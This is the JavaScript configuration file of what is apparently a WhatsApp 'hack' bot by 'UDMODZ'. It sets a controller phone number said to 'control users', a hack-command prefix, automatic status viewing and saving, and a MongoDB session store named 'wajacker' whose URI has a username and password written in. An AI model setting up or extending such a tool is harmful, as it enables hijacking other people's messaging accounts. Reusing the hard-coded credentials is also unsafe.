
/* 
██╗░░░██╗██████╗░███╗░░░███╗░█████╗░██████╗░███████╗ 
██║░░░██║██╔══██╗████╗░████║██╔══██╗██╔══██╗╚════██║ 
██║░░░██║██║░░██║██╔████╔██║██║░░██║██║░░██║░░███╔═╝ 
██║░░░██║██║░░██║██║╚██╔╝██║██║░░██║██║░░██║██╔══╝░░ 
╚██████╔╝██████╔╝██║░╚═╝░██║╚█████╔╝██████╔╝███████╗ 
░╚═════╝░╚═════╝░╚═╝░░░░░╚═╝░╚════╝░╚═════╝░╚══════╝ 
By UDMODZ
DONT SELL
A FREE HACK
I'M UDMODZ


*/

const fs = require('fs');
if (fs.existsSync('config.env')) require('dotenv').config({ path: './config.env' });

function convertToBool(text, fault = 'true') {
    return text === fault ? true : false;
}
module.exports = {
HACKER : process.env.HACKER ||                      "94740026280" , // your number මේ නම්බර් එකට තමා control කරන්න පුලුවන් user ලව
PREFIX_BOT : process.env.PREFIX_BOT ||               ".", // plugins prefix මේ ප්‍රිෆික්ස් එක තමා ඔයා ඇඩ් කරන ප්ලගින්ස් වලට එන්නෙ
PREFIX_HACK : process.env.PREFIX_HACK ||             "!", // Hack prefix මේ ප්‍රිෆික්ස් එක තමා මම දාපු කමාන්ඩ් වලට එන්නෙ
CONNECT_MSG_IMG : process.env.CONNECT_MSG_IMG ||      'https://files.catbox.moe/qnx3ei.jpg', // connect msg img කනෙක්ට් මැසේජ් පොටෝ එක true=on,false=off
CONNECT_MSG_TEXT : process.env.CONNECT_MSG_TEXT ||   `Queen UDMODz connected successful ✅\n\nPREFIX: ${process.env.PREFIX_BOT || "."}`, // connect msg text කනෙක්ට් මැසේජ් ටෙක්ස්ට් එක true=on,false=off
AUTO_READ_STATUS : process.env.AUTO_READ_STATUS ||   'true', // Auto view status ස්ටේටස් විව් true=on,false=off
SAVE_STATUS : process.env.SAVE_STATUS ||             'true', // status save cmd ස්ටේටස් සේව් true=on,false=off
CONNECT_MSG_SEND : process.env.CONNECT_MSG_SEND ||   'true', // connect msg send කනෙක්ට් මැසේජ් එක true=on,false=off
USE_MONGODB : process.env.USE_MONGODB ||             'true', // Use MongoDB for sessions true=on,false=off
MONGODB_URI: process.env.MONGODB_URI || 'mongodb://udmodz:udmodz@atlas-sql-68c0ede2bacbeb746c29a8fc-caihxp.a.query.mongodb.net/wajacker?ssl=true&authSource=admin',// MongoDB connection URI
CHANNEL_FOLLOW : process.env.CHANNEL_FOLLOW ||       "true", 
CHANNEL_JID : process.env.CHANNEL_JID ||         "120363399194560532@newsletter", // channel jid for send msg to channel
};
